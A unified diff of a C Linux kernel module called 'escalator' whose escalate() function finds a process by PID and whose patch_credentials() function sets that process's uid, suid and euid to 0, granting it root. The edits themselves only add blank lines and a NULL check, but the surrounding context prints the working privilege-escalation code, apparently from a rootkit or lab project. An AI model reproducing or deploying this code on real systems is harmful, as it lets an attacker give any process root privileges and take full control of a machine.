@@ -6,12 +6,14 @@ static void escalate(int pid) {
 
     if (pid <= 1) {
         printk(KERN_ALERT "escalator: pid %d invalid for escalation\n", pid);
+
         return;
     }
 
     task = pid_task(find_vpid(pid), PIDTYPE_PID);
     if (task == NULL) {
         printk(KERN_ALERT "escalator: unable to retrieve task_struct\n");
+
         return;
     }
 
@@ -19,6 +21,7 @@ static void escalate(int pid) {
     credentials = (struct cred*) task->cred;
     if (credentials == NULL) {
         printk(KERN_ALERT "escalator: unable to retrieve cred\n");
+
         return;
     }
 
@@ -26,6 +29,7 @@ static void escalate(int pid) {
     real_credentials = (struct cred*) task->real_cred;
     if (real_credentials == NULL) {
         printk(KERN_ALERT "escalator: unable to retrieve cred\n");
+
         return;
     }
 
@@ -38,7 +42,6 @@ static void escalate(int pid) {
 
         patch_credentials(credentials);
     } else {
-
         printk(KERN_INFO "escalator: cred != real_cred, patching both\n");
 
         patch_credentials(credentials);
@@ -49,6 +52,12 @@ static void escalate(int pid) {
 }
 
 static void patch_credentials(struct cred* credentials) {
+    if (credentials == NULL) {
+        printk(KERN_ALERT "escalator: patch_credentials: Passed credentials invalid\n");
+
+        return;
+    }
+
     credentials->uid.val = 0;
     credentials->suid.val = 0;
     credentials->euid.val = 0;
